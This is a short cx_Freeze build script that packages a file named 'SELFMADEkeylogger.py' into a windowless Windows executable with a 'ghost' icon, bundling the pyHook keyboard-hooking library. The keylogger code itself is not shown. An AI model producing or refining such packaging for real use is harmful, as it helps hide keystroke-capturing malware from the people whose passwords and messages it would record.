import sys
from cx_Freeze import setup, Executable

buildOptions = dict(
    includes=['pythoncom'],
    packages=['pyHook']
)

target = Executable(
    script="SELFMADEkeylogger.py",
    base="Win32GUI",
    icon="ghost.ico"
    )

setup(
    name = "keylogger",
    version = "3.1",
    description = "Hadi keylogger",
    executables = [target]
    )
